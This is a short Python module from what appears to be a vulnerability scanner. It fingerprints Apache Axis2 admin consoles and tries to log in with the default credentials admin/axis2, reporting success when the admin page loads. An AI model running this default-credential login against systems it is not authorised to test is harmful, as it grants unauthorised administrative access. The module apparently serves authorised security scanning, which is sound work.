# -*- coding:utf-8 -*-
# axis2弱密码

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests


class POC:

    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)

    def fingerprint(self):
        try:
            if self.service.url and "Apache-Coyote" in self.service.server:
                resp_1 = self.requestUtil.get(self.service.url + "/axis2/")
                resp_2 = self.requestUtil.get(self.service.url + "/axis2-admin/")
                if resp_1.status_code == 200:
                    return "/axis2/axis2-admin/"
                elif resp_2.status_code == 200:
                    return "/axis2-admin/"
        except:
            return False

    def poc(self):
        try:
            if True:
                resp = self.requestUtil.post(self.service.url + self.service.speciality + "login",
                                        data="userName=admin&password=axis2&submit=+Login+")
                print(resp.text)
                if "Tools" in resp.text:
                    return (["axis2弱密码", "用户名: admin<br>密码: axis2"], self.service.speciality)
        except:
            return []
